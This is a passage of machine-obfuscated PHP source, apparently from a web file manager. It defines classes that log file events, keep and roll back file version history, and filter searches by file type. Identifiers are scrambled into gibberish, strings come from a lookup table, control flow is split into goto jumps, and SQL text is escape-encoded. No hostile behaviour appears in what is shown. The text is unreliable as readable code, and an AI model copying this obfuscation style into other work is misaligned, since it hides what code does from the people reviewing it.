cä­‚”İ÷å; eÀòëâÜ©„: } private function addSystemLog($d‹×í›† ª, $d§ ¦·§ª©) { $bšëŠÂØÎñ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($d‹×í›† ª == $bšëŠÂØÎñ[1932]) { $d‹×í›† ª = $d§ ¦·§ª©[$bšëŠÂØÎñ[445]][$bšëŠÂØÎñ[1933]]; } else { if (in_array($d‹×í›† ª, array($bšëŠÂØÎñ[1696], $bšëŠÂØÎñ[1934]))) { $d‹×í›† ª = $d§ ¦·§ª©[$bšëŠÂØÎñ[445]][$bšëŠÂØÎñ[736]]; } } $AéİŸªÙŞ = array_merge($d§ ¦·§ª©, array($bšëŠÂØÎñ[1935] => $d§ ¦·§ª©[$bšëŠÂØÎñ[397]], $bšëŠÂØÎñ[1936] => $d§ ¦·§ª©[$bšëŠÂØÎñ[1936]])); Model($bšëŠÂØÎñ[1660])->addLog($bšëŠÂØÎñ[1937] . $d‹×í›† ª, $AéİŸªÙŞ); } private function isCacheEvent($bòã›ä¡—£, $dÅöÒêÄÄÑ) { if ($bòã›ä¡—£[$_SERVER[Ôğ—¤Šµˆ˜ñ£][406]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($e™¥¨ÓÓª, $B—¥Ï‚™²Ú) { $d·ÖÊ£•­Ä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a³‰‚º’‡Á = Model($d·ÖÊ£•­Ä[1227])->sourceInfo($e™¥¨ÓÓª); $Dèš¼ïŠé = array($d·ÖÊ£•­Ä[1933] => $B—¥Ï‚™²Ú, $d·ÖÊ£•­Ä[28] => $a³‰‚º’‡Á[$d·ÖÊ£•­Ä[28]]); return $this->addEvent($e™¥¨ÓÓª, $d·ÖÊ£•­Ä[1932], $Dèš¼ïŠé); } public function eventFileEdit($Dî‚©…®±ù) { $d‰‚ğ¹‚«‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c«ã–…Šà‘ = array($d‰‚ğ¹‚«‘[1938] => $_SERVER[$d‰‚ğ¹‚«‘[1939]], $d‰‚ğ¹‚«‘[1940] => strtolower(ACTION)); return $this->addEvent($Dî‚©…®±ù, $d‰‚ğ¹‚«‘[1686], $c«ã–…Šà‘); } public function eventRecycle($aĞö–Èğé”, $B‰»‡¾§ŠÇ) { return $this->addEvent($aĞö–Èğé”, $_SERVER[Ôğ—¤Šµˆ˜ñ£][1934], $B‰»‡¾§ŠÇ); } public function eventRemove($a‡Û”‘¡Ò–) { $dÛ‹¢Ÿ‚…Æ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d’Å°ß‹ˆ = Model($dÛ‹¢Ÿ‚…Æ[1227])->sourceInfo($a‡Û”‘¡Ò–); $FæÀğÄ³¨¼ = $d’Å°ß‹ˆ[$dÛ‹¢Ÿ‚…Æ[28]]; return $this->addEvent($d’Å°ß‹ˆ[$dÛ‹¢Ÿ‚…Æ[492]], $dÛ‹¢Ÿ‚…Æ[1685], $FæÀğÄ³¨¼); } public function eventShare($c˜Ò¦ÀÄ, $cìª¸Ñ‚°) { return $this->addEvent($c˜Ò¦ÀÄ, $_SERVER[Ôğ—¤Šµˆ˜ñ£][1696], $cìª¸Ñ‚°); } public function eventMove($bº½œÎ‡Îª, $E„œŒ£¢Óù, $E¢ ößí§) { goto d¦²ôÇØ”; F¶×ˆ¯ê½ó: $this->addEvent($bº½œÎ‡Îª, $D‚æİáÃÈÔ[545], $CÏÃÁÖ±ÜÛ); $dÍ—êâÍ› = $a‰ñ™—Ÿ—->sourceInfo($bº½œÎ‡Îª); $CÏÃÁÖ±ÜÛ = array($D‚æİáÃÈÔ[397] => $dÍ—êâÍ›[$D‚æİáÃÈÔ[397]], $D‚æİáÃÈÔ[28] => $dÍ—êâÍ›[$D‚æİáÃÈÔ[28]]); goto eÄÏ­ª¶™Ü; d¦²ôÇØ”: $D‚æİáÃÈÔ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a‰ñ™—Ÿ— = Model($D‚æİáÃÈÔ[1227]); $dÍ—êâÍ› = $a‰ñ™—Ÿ—->sourceInfo($bº½œÎ‡Îª); goto Fƒ¿‡ó…; eÄÏ­ª¶™Ü: $this->addEvent($E„œŒ£¢Óù, $D‚æİáÃÈÔ[1944], $CÏÃÁÖ±ÜÛ); goto Eöàæ½‹»³; Fƒ¿‡ó…: $F¾á’Û„ò = $a‰ñ™—Ÿ—->sourceInfo($E„œŒ£¢Óù); $A¯óÒ“ÚÙ = $a‰ñ™—Ÿ—->sourceInfo($E¢ ößí§); $CÏÃÁÖ±ÜÛ = array($D‚æİáÃÈÔ[1076] => $E„œŒ£¢Óù, $D‚æİáÃÈÔ[1941] => $F¾á’Û„ò[$D‚æİáÃÈÔ[28]], $D‚æİáÃÈÔ[1921] => !empty($F¾á’Û„ò[$D‚æİáÃÈÔ[513]]) ? $F¾á’Û„ò[$D‚æİáÃÈÔ[513]] : $D‚æİáÃÈÔ[33], $D‚æİáÃÈÔ[1077] => $E¢ ößí§, $D‚æİáÃÈÔ[1942] => $A¯óÒ“ÚÙ[$D‚æİáÃÈÔ[28]], $D‚æİáÃÈÔ[1943] => !empty($A¯óÒ“ÚÙ[$D‚æİáÃÈÔ[513]]) ? $A¯óÒ“ÚÙ[$D‚æİáÃÈÔ[513]] : $D‚æİáÃÈÔ[33]); goto F¶×ˆ¯ê½ó; Eöàæ½‹»³: } public function eventCopy($c Öç¨ÓÛŞ) { $this->eventCreate($c Öç¨ÓÛŞ, $_SERVER[Ôğ—¤Šµˆ˜ñ£][543]); } public function eventRename($Aé”æª” , $C‚¼Å—†ƒí, $eÂäÇƒšªÈ) { $fÏëÔ«ä®¤ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A‹ĞŞ×¦Éğ = array($fÏëÔ«ä®¤[1076] => $C‚¼Å—†ƒí, $fÏëÔ«ä®¤[1077] => $eÂäÇƒšªÈ); return $this->addEvent($Aé”æª” , $fÏëÔ«ä®¤[1241], $A‹ĞŞ×¦Éğ); } public function eventAddComment($C¬·İ…Â«, $d®ØÉ…œÑ) { return $this->addEvent($C¬·İ…Â«, $_SERVER[Ôğ—¤Šµˆ˜ñ£][1945], $d®ØÉ…œÑ); } public function eventAddDesc($bÂ­Ô¼éÜ‰, $c¤×µŒÅçè) { return $this->addEvent($bÂ­Ô¼éÜ‰, $_SERVER[Ôğ—¤Šµˆ˜ñ£][1946], $c¤×µŒÅçè); } public function listBySource($d‡Ä®™šÑ) { goto eçË…ÍñÉ; e¤Ú’åñ•À: return $this->eventListParse($D¥íéÜİÖ, $d‡Ä®™šÑ); goto bà—ŒÍ¯ñ; eçË…ÍñÉ: $bºá¬ĞåØ™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DŒäïÛùÚÓ = Model($bºá¬ĞåØ™[1227])->sourceInfo($d‡Ä®™šÑ); $CÏœâ´Î› = array($bºá¬ĞåØ™[412] => $d‡Ä®™šÑ); goto a³·‰˜Õ»; a³·‰˜Õ»: if ($DŒäïÛùÚÓ[$bºá¬ĞåØ™[405]] == $bºá¬ĞåØ™[87]) { $bÓß·‡õŒÈ = Model($bºá¬ĞåØ™[1227])->listSearchChildren($d‡Ä®™šÑ, 20000); $bÓß·‡õŒÈ[] = $d‡Ä®™šÑ . $bºá¬ĞåØ™[376]; $CÏœâ´Î› = array($bºá¬ĞåØ™[397] => array($bºá¬ĞåØ™[7], $bÓß·‡õŒÈ)); } $D¥íéÜİÖ = $this->where($CÏœâ´Î›)->order($bºá¬ĞåØ™[1947])->selectPage(); if ($D¥íéÜİÖ[$bºá¬ĞåØ™[364]][$bºá¬ĞåØ™[365]] == 0) { $D¥íéÜİÖ[$bºá¬ĞåØ™[364]][$bºá¬ĞåØ™[365]] = 1; $D¥íéÜİÖ[$bºá¬ĞåØ™[367]] = array(array($bºá¬ĞåØ™[412] => $d‡Ä®™šÑ, $bºá¬ĞåØ™[1930] => $DŒäïÛùÚÓ[$bºá¬ĞåØ™[492]], $bºá¬ĞåØ™[1541] => $DŒäïÛùÚÓ[$bºá¬ĞåØ™[446]], $bºá¬ĞåØ™[417] => $bºá¬ĞåØ™[1948], $bºá¬ĞåØ™[418] => $DŒäïÛùÚÓ[$bºá¬ĞåØ™[194]], $bºá¬ĞåØ™[1543] => $bºá¬ĞåØ™[33])); } goto e¤Ú’åñ•À; bà—ŒÍ¯ñ: } private function eventListParse($d§¦½ÁñØá, $cèë¦ô´ ê) { goto D¢Áî‘ÏÂ; b–íÔëÃç: $Bï±Œİƒ³ = array_unique($Bï±Œİƒ³); $Aì‡Ãëòµ¸ = array_unique(array_to_keyvalue($a–Ê·ø…ë¸, $cİî¿‚ˆº‘[33], $cİî¿‚ˆº‘[1550])); $dğ„ã¥­›î = Model($cİî¿‚ˆº‘[532])->userListInfo($Aì‡Ãëòµ¸); goto Cëá‚ïä“; D¢Áî‘ÏÂ: $cİî¿‚ˆº‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a–Ê·ø…ë¸ = $d§¦½ÁñØá[$cİî¿‚ˆº‘[367]]; $Bï±Œİƒ³ = array_to_keyvalue($a–Ê·ø…ë¸, $cİî¿‚ˆº‘[33], $cİî¿‚ˆº‘[397]); goto E ¿æ»’„½; e†‘‚‚ªŒà: $d§¦½ÁñØá[$cİî¿‚ˆº‘[367]] = $a–Ê·ø…ë¸; return $d§¦½ÁñØá; goto EéÊõçÓÖÛ; Cëá‚ïä“: $fô…÷È©Š‰ = Model($cİî¿‚ˆº‘[813])->sourceListInfo($Bï±Œİƒ³, !0); foreach ($a–Ê·ø…ë¸ as &$Cº¾«½ÂÔÑ) { if ($Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[29]] == $cİî¿‚ˆº‘[545] && isset($Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[445]][$cİî¿‚ˆº‘[1076]])) { $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[445]][$cİî¿‚ˆº‘[1076]] = $fô…÷È©Š‰[$Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[445]][$cİî¿‚ˆº‘[1076]]]; $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[445]][$cİî¿‚ˆº‘[1077]] = $fô…÷È©Š‰[$Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[445]][$cİî¿‚ˆº‘[1077]]]; } if ($Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[29]] == $cİî¿‚ˆº‘[1944] && isset($Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[445]][$cİî¿‚ˆº‘[397]])) { $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[445]][$cİî¿‚ˆº‘[397]] = $fô…÷È©Š‰[$Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[445]][$cİî¿‚ˆº‘[397]]]; } $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[85]] = $fô…÷È©Š‰[$Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[397]]]; $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[1949]] = $fô…÷È©Š‰[$Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[1936]]]; if ($Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[29]] == $cİî¿‚ˆº‘[1685]) { $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[1949]] = $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[85]]; $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[1936]] = $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[1949]][$cİî¿‚ˆº‘[397]]; $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[85]] = !1; $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[397]] = $cİî¿‚ˆº‘[33]; } $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[1881]] = $dğ„ã¥­›î[$Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[1550]]]; } unset($Cº¾«½ÂÔÑ); goto e†‘‚‚ªŒà; E ¿æ»’„½: $D¬ÖšˆçÇ = array_to_keyvalue($a–Ê·ø…ë¸, $cİî¿‚ˆº‘[33], $cİî¿‚ˆº‘[1936]); foreach ($a–Ê·ø…ë¸ as $Cº¾«½ÂÔÑ) { $Cœ”‘Å‡Ùô = $Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[445]]; if ($Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[29]] == $cİî¿‚ˆº‘[545] && isset($Cœ”‘Å‡Ùô[$cİî¿‚ˆº‘[1076]])) { $Bï±Œİƒ³[] = $Cœ”‘Å‡Ùô[$cİî¿‚ˆº‘[1076]] . $cİî¿‚ˆº‘[33]; $Bï±Œİƒ³[] = $Cœ”‘Å‡Ùô[$cİî¿‚ˆº‘[1077]] . $cİî¿‚ˆº‘[33]; } if ($Cº¾«½ÂÔÑ[$cİî¿‚ˆº‘[29]] == $cİî¿‚ˆº‘[1944] && isset($Cœ”‘Å‡Ùô[$cİî¿‚ˆº‘[397]])) { $Bï±Œİƒ³[] = $Cœ”‘Å‡Ùô[$cİî¿‚ˆº‘[397]] . $cİî¿‚ˆº‘[33]; } } $Bï±Œİƒ³ = array_merge($Bï±Œİƒ³, $D¬ÖšˆçÇ, array($cèë¦ô´ ê . $cİî¿‚ˆº‘[33])); goto b–íÔëÃç; EéÊõçÓÖÛ: } public function removeBySource($AñìÍ‚ò¯í) { $c¿™ÁˆÔŸ = array($_SERVER[Ôğ—¤Šµˆ˜ñ£][412] => $AñìÍ‚ò¯í); $this->where($c¿™ÁˆÔŸ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\162\143\145\137\150\x69\163\x74\x6f\162\x79"; public function historyCount($e‡°œ½Äµô) { goto c¶«ÈÏ„²â; c¶«ÈÏ„²â: $CÃÆ¦à¬¹ó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$e‡°œ½Äµô) { return array(); } if (is_string($e‡°œ½Äµô) || is_int($e‡°œ½Äµô)) { $e‡°œ½Äµô = array($e‡°œ½Äµô); } goto cÎ·É¿œğŠ; cÎ·É¿œğŠ: $d¯âì‹Š„ô = array($CÃÆ¦à¬¹ó[397], $CÃÆ¦à¬¹ó[1751] => $CÃÆ¦à¬¹ó[494]); $Dìº×ˆ²ñÜ = array($CÃÆ¦à¬¹ó[397] => array($CÃÆ¦à¬¹ó[7], $e‡°œ½Äµô)); $BòÉ‰„ĞŠˆ = $this->field($d¯âì‹Š„ô)->where($Dìº×ˆ²ñÜ)->group($CÃÆ¦à¬¹ó[397])->select(); goto aÅÊ‰§µÔ÷; aÅÊ‰§µÔ÷: return array_to_keyvalue($BòÉ‰„ĞŠˆ, $CÃÆ¦à¬¹ó[397], $CÃÆ¦à¬¹ó[494]); goto Bë¨¢È¿–â; Bë¨¢È¿–â: } public function addHistory($e³½Üîö·•, $f©Ÿãä·õù = '') { $B¨ ³ä•šŞ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e°ˆ±®šİ = array($B¨ ³ä•šŞ[412] => $e³½Üîö·•[$B¨ ³ä•šŞ[397]], $B¨ ³ä•šŞ[1541] => isset($e³½Üîö·•[$B¨ ³ä•šŞ[448]]) ? $e³½Üîö·•[$B¨ ³ä•šŞ[448]] : $e³½Üîö·•[$B¨ ³ä•šŞ[446]], $B¨ ³ä•šŞ[462] => $e³½Üîö·•[$B¨ ³ä•šŞ[461]], $B¨ ³ä•šŞ[573] => $e³½Üîö·•[$B¨ ³ä•šŞ[78]], $B¨ ³ä•šŞ[1950] => $f©Ÿãä·õù); $eÛÊÎÙß = $GLOBALS[$B¨ ³ä•šŞ[6]][$B¨ ³ä•šŞ[88]][$B¨ ³ä•šŞ[1125]]; if ($eÛÊÎÙß > 1) { $this->historyAutoClear($e°ˆ±®šİ[$B¨ ³ä•šŞ[397]]); $this->add($e°ˆ±®šİ); } Hook::trigger($B¨ ³ä•šŞ[1951], $e°ˆ±®šİ); Model($B¨ ³ä•šŞ[1952])->eventFileEdit($e³½Üîö·•[$B¨ ³ä•šŞ[397]]); } private function historyAutoClear($AàÛ¹™¢öÉ) { goto fßÅã®ë½È; C‚á¦óŒÇ: $this->where($DÎ“Ê÷Œ‚‡)->delete(); Model($cºˆ×·Ï÷±[464])->remove($d¨¯¿«¢¸ß); goto DÍ­É²Í¿è; Cİ¡ÀõŸ‘: $FÜğë¢¶ã = $d…ŸÃŒù©• == $cºˆ×·Ï÷±[1148] ? 5 : $B»¡§¹¬­Á; if ($B»¡§¹¬­Á <= 1) { $FÜğë¢¶ã = 1; } if ($FÜğë¢¶ã >= 500) { return; } goto b†ø—ÀšùŞ; fßÅã®ë½È: $cºˆ×·Ï÷± =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d…ŸÃŒù©• = Model($cºˆ×·Ï÷±[751])->get($cºˆ×·Ï÷±[1147]); $B»¡§¹¬­Á = $GLOBALS[$cºˆ×·Ï÷±[6]][$cºˆ×·Ï÷±[88]][$cºˆ×·Ï÷±[1125]]; goto Cİ¡ÀõŸ‘; C¡‹‹Ï‹çœ: $Dµôç¥Áˆ = array_to_keyvalue($cİ¨Ü˜ Û, $cºˆ×·Ï÷±[33], $cºˆ×·Ï÷±[395]); $Dµôç¥Áˆ = array_slice($Dµôç¥Áˆ, $FÜğë¢¶ã); $d¨¯¿«¢¸ß = array_to_keyvalue($cİ¨Ü˜ Û, $cºˆ×·Ï÷±[33], $cºˆ×·Ï÷±[461]); goto aÕŒ…È¸; b†ø—ÀšùŞ: $DÎ“Ê÷Œ‚‡ = array($cºˆ×·Ï÷±[412] => $AàÛ¹™¢öÉ); $cİ¨Ü˜ Û = $this->field($cºˆ×·Ï÷±[1953])->where($DÎ“Ê÷Œ‚‡)->order($cºˆ×·Ï÷±[1947])->select(); if (!$cİ¨Ü˜ Û || $FÜğë¢¶ã >= count($cİ¨Ü˜ Û)) { return; } goto C¡‹‹Ï‹çœ; aÕŒ…È¸: $d¨¯¿«¢¸ß = array_slice($d¨¯¿«¢¸ß, $FÜğë¢¶ã); if (!$Dµôç¥Áˆ || !$d¨¯¿«¢¸ß) { return; } $DÎ“Ê÷Œ‚‡ = array($cºˆ×·Ï÷±[414] => array($cºˆ×·Ï÷±[7], $Dµôç¥Áˆ)); goto C‚á¦óŒÇ; DÍ­É²Í¿è: } public function listData($bßÓ‰œ»‡§) { goto C­ŸØÄø›; fÖ¨®¹¬ô‹: $Fµ•šâ†˜ = 5; if ($e‚É·´‰Æ == $cÈ²¨ç¥‰[1148]) { $dÂÙàº­Ü[$cÈ²¨ç¥‰[367]] = array_slice($dÂÙàº­Ü[$cÈ²¨ç¥‰[367]], 0, $Fµ•šâ†˜); $dÂÙàº­Ü[$cÈ²¨ç¥‰[364]] = array($cÈ²¨ç¥‰[1955] => 1, $cÈ²¨ç¥‰[1956] => 20, $cÈ²¨ç¥‰[1957] => 1, $cÈ²¨ç¥‰[1958] => count($dÂÙàº­Ü[$cÈ²¨ç¥‰[367]])); } return $dÂÙàº­Ü; goto D¹ÕÄæ‹È; eàğ†¬†: $dÂÙàº­Ü = $this->field($Bœ”Ğ¼)->where($f¯À­ö‰Ì”)->order($cÈ²¨ç¥‰[1947])->selectPage(); $this->_listAppendUser($dÂÙàº­Ü[$cÈ²¨ç¥‰[367]]); $e‚É·´‰Æ = Model($cÈ²¨ç¥‰[751])->get($cÈ²¨ç¥‰[1147]); goto fÖ¨®¹¬ô‹; C­ŸØÄø›: $cÈ²¨ç¥‰ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f¯À­ö‰Ì” = array($cÈ²¨ç¥‰[412] => $bßÓ‰œ»‡§); $Bœ”Ğ¼ = $cÈ²¨ç¥‰[1954]; goto eàğ†¬†; D¹ÕÄæ‹È: } protected function _listAppendUser(&$få›îÔšó) { $D‹ÎšÀ‚‹¦ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dÒ»ƒô× = array_to_keyvalue($få›îÔšó, $D‹ÎšÀ‚‹¦[33], $D‹ÎšÀ‚‹¦[1550]); $eƒ¹ùå¯¾¾ = Model($D‹ÎšÀ‚‹¦[532])->userListInfo($dÒ»ƒô×); foreach ($få›îÔšó as &$aÈ…•ŒöØÊ) { $d¶•¥Õ¾¦· = $aÈ…•ŒöØÊ[$D‹ÎšÀ‚‹¦[1550]]; $aÈ…•ŒöØÊ[$D‹ÎšÀ‚‹¦[446]] = $eƒ¹ùå¯¾¾[$d¶•¥Õ¾¦·] ? $eƒ¹ùå¯¾¾[$d¶•¥Õ¾¦·] : !1; } unset($aÈ…•ŒöØÊ); } public function fileInfo($fõ­Û°è°Ê) { $CÔ¤´”ïË =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DÈÏã¢ÕÓ = $this->tablePrefix; $c²ù¬´·Î = "{$DÈÏã¢ÕÓ}\151\157\137\x66\151\x6c\x65\40\x66\x69\154\x65\x73\x20\x6f\x6e\40\146\151\x6c\145\x73\x2e\x66\x69\154\x65\x49\x44\40\75\x20\150\x69\163\164\x6f\x72\171\x2e\x66\151\x6c\145\111\104"; return $this->alias($CÔ¤´”ïË[1959])->where(array($CÔ¤´”ïË[414] => $fõ­Û°è°Ê))->join($c²ù¬´·Î, $CÔ¤´”ïË[1960])->find(); } public function removeItem($Aƒ›·‰À¶ï) { $E–ÊØßéÔÜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bø¨†¬ë› = array($E–ÊØßéÔÜ[414] => $Aƒ›·‰À¶ï); $b¸´ø¾Šµ = $this->where($bø¨†¬ë›)->find(); if ($b¸´ø¾Šµ) { $BîÆ‡íÜ = $this->where($bø¨†¬ë›)->delete(); Model($E–ÊØßéÔÜ[464])->remove($b¸´ø¾Šµ[$E–ÊØßéÔÜ[461]]); return $BîÆ‡íÜ; } return !1; } public function removeBySource($eñ–’ùé×¶) { goto Eœ¶‘¹Ìó; F¢İÀß‘½”: return !0; goto f¤¿†ÊÌÉ¹; Eœ¶‘¹Ìó: $eİÖ†’ÚŞÎ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$eñ–’ùé×¶) { return !1; } if (!is_array($eñ–’ùé×¶)) { $eñ–’ùé×¶ = array($eñ–’ùé×¶); } goto aÔƒì¿‚Ä; aÔƒì¿‚Ä: $fñ™˜ÇßÂ˜ = array($eİÖ†’ÚŞÎ[412] => array($eİÖ†’ÚŞÎ[7], $eñ–’ùé×¶)); $c‰— ªßĞ­ = $this->field($eİÖ†’ÚŞÎ[462])->where($fñ™˜ÇßÂ˜)->select(); if ($c‰— ªßĞ­) { $this->where($fñ™˜ÇßÂ˜)->delete(); $f‹´”Ü¡Ì´ = array_to_keyvalue($c‰— ªßĞ­, $eİÖ†’ÚŞÎ[33], $eİÖ†’ÚŞÎ[461]); Model($eİÖ†’ÚŞÎ[464])->remove($f‹´”Ü¡Ì´); } goto F¢İÀß‘½”; f¤¿†ÊÌÉ¹: } public function setDetail($e¶ÖŠ”¨Œ, $cŠ©Ö¶¼ÅÁ) { $a±¤Øöª =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return $this->where(array($a±¤Øöª[414] => $e¶ÖŠ”¨Œ))->save(array($a±¤Øöª[1950] => $cŠ©Ö¶¼ÅÁ)); } public function rollbackToItem($Dæâàè÷Ú, $EŒŞ›ÏÉËö) { goto CÕ‚œ‹±´©; CÕ‚œ‹±´©: $Bî…¬ì¸¡ª =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D·˜Æ’Û´´ = Model($Bî…¬ì¸¡ª[813])->sourceInfo($Dæâàè÷Ú); $this->addHistory($D·˜Æ’Û´´, LNG($Bî…¬ì¸¡ª[1961])); goto DÎÇ±Å©âÑ; C×¯òÜ¤ãĞ: return $this->where(array($Bî…¬ì¸¡ª[414] => $EŒŞ›ÏÉËö))->delete(); goto FÓßÇ»½‚¢; DÎÇ±Å©âÑ: $Eâºó…‡Äâ = $this->find($EŒŞ›ÏÉËö); $FØÖËÓÃ© = array($Bî…¬ì¸¡ª[461] => $Eâºó…‡Äâ[$Bî…¬ì¸¡ª[461]], $Bî…¬ì¸¡ª[78] => $Eâºó…‡Äâ[$Bî…¬ì¸¡ª[78]], $Bî…¬ì¸¡ª[84] => time(), $Bî…¬ì¸¡ª[448] => USER_ID); Model($Bî…¬ì¸¡ª[813])->where(array($Bî…¬ì¸¡ª[397] => $Dæâàè÷Ú))->save($FØÖËÓÃ©); goto C×¯òÜ¤ãĞ; FÓßÇ»½‚¢: } public function clearSame($eÚ²Åë¶³ß) { goto b©‰®•ó®; b×–´Ÿ±õÈ: if (!$E™Ö—Å‰æê) { return; } $this->where(array($BÉ´ˆ™‹ô×[395] => array($BÉ´ˆ™‹ô×[7], $E™Ö—Å‰æê)))->delete(); Model($BÉ´ˆ™‹ô×[464])->remove($E“‰œ¡Ğğ¿); goto bÕÑÉ°«Ÿ’; eîî¬ÀöÉÎ: $E“‰œ¡Ğğ¿ = array(); $E™Ö—Å‰æê = array(); foreach ($cƒˆÖƒÅÌ as $EÜóì…·) { if (!$EÜóì…· || count($EÜóì…·) <= 1) { continue; } foreach ($EÜóì…· as $Dõ÷ä î½) { $E“‰œ¡Ğğ¿[] = $Dõ÷ä î½[$BÉ´ˆ™‹ô×[461]]; $E™Ö—Å‰æê[] = $Dõ÷ä î½[$BÉ´ˆ™‹ô×[395]]; } } goto b×–´Ÿ±õÈ; b©‰®•ó®: $BÉ´ˆ™‹ô× =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f¼™©´²¢ = $this->listData($eÚ²Åë¶³ß); $cƒˆÖƒÅÌ = array_to_keyvalue_group($f¼™©´²¢, $BÉ´ˆ™‹ô×[461]); goto eîî¬ÀöÉÎ; bÕÑÉ°«Ÿ’: } public function userSpace() { $càó¨ÙÜ¡¾ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c£ï´¼ê ‡ = $this->tablePrefix; $BÓê…æ©¬Š = array($càó¨ÙÜ¡¾[1541] => USER_ID); $f¢¼å›®Œ = "{$c£ï´¼ê ‡}\151\157\137\x66\x69\x6c\x65\40\x66\151\154\145\163\x20\x6f\156\40\x66\x69\x6c\x65\x73\56\x66\x69\x6c\x65\111\x44\40\x3d\40\x68\x69\163\164\x6f\x72\x79\56\146\151\154\145\111\x44"; return $this->alias($càó¨ÙÜ¡¾[1959])->where($BÓê…æ©¬Š)->join($f¢¼å›®Œ, $càó¨ÙÜ¡¾[1960])->sum($càó¨ÙÜ¡¾[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($d‘¸˜‰ˆ«Ö) { goto d³²‹ÛÊæÅ; cÌ¯Š†×Àğ: if (!$F³¶š•ªöÇ) { return array(); } $B›íÀ‚Ã¿¯ = $F³¶š•ªöÇ[$Cïƒ£İÆ¾»[168]]; $e¼æÆõ²§‘ = $Cïƒ£İÆ¾»[7]; goto fËë²ˆ’­; fËë²ˆ’­: if (!$F³¶š•ªöÇ[$Cïƒ£İÆ¾»[168]]) { $F¹º½¹âÉ¥ = array_to_keyvalue($DÓÊÈ†© , $Cïƒ£İÆ¾»[33], $Cïƒ£İÆ¾»[168]); $B›íÀ‚Ã¿¯ = implode($Cïƒ£İÆ¾»[47], $F¹º½¹âÉ¥); $e¼æÆõ²§‘ = $Cïƒ£İÆ¾»[1962]; } $B«ÅµºªŠÜ = explode($Cïƒ£İÆ¾»[47], trim($B›íÀ‚Ã¿¯, $Cïƒ£İÆ¾»[47])); return array($e¼æÆõ²§‘, $B«ÅµºªŠÜ); goto e„ÅÒ†¬ Œ; d³²‹ÛÊæÅ: $Cïƒ£İÆ¾» =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DÓÊÈ†©  = KodIO::fileTypeList(); $F³¶š•ªöÇ = $DÓÊÈ†© [$d‘¸˜‰ˆ«Ö]; goto cÌ¯Š†×Àğ; e„ÅÒ†¬ Œ: } public function listPathType($cÉÙÉ¨ëˆí) { $CÌ›åÅÌ££ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $føò¹¢×… = $this->fileTypeWhere($cÉÙÉ¨ëˆí); if (!$føò¹¢×…) { return array(); } $cñ¼Ù…™àµ = array($CÌ›åÅÌ££[574] => SourceModel::TYPE_USER, $CÌ›åÅÌ££[575] => USER_ID, $CÌ›åÅÌ££[571] => 0, $CÌ›åÅÌ££[572] => $føò¹¢×…); return $this->listSource($cñ¼Ù…™àµ); } public function listSearch($B‚ äÕÎ÷Ï, $Dï°ß‘Å‹Ü = 300) { goto E¢ê¡ëå; f½ÑšÛì¶·: $aë¸ˆ†ˆ³¥ = $DØ£®Öö÷·; if (!isset($DØ£®Öö÷·[$B‹‚ÑŠ÷·„[425]])) { $DØ£®Öö÷·[$B‹‚ÑŠ÷·„[425]] = 0; } $c Š½°§© = $B‹‚ÑŠ÷·„[1964]; goto f¦ìó ¥§å; E¢ê¡ëå: $B‹‚ÑŠ÷·„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (isset($B‚ äÕÎ÷Ï[$B‹‚ÑŠ÷·„[1807]]) && $B‚ äÕÎ÷Ï[$B‹‚ÑŠ÷·„[1807]]) { $B‚ äÕÎ÷Ï[$B‹‚ÑŠ÷·„[1807]] = str_replace($B‹‚ÑŠ÷·„[382], $B‹‚ÑŠ÷·„[1963], trim($B‚ äÕÎ÷Ï[$B‹‚ÑŠ÷·„[1807]])); } $DØ£®Öö÷· = $this->_parseSearchWhere($B‚ äÕÎ÷Ï); goto f½ÑšÛì¶·; f¦ìó ¥§å: $bà·¬ºˆìç = $c Š½°§©; 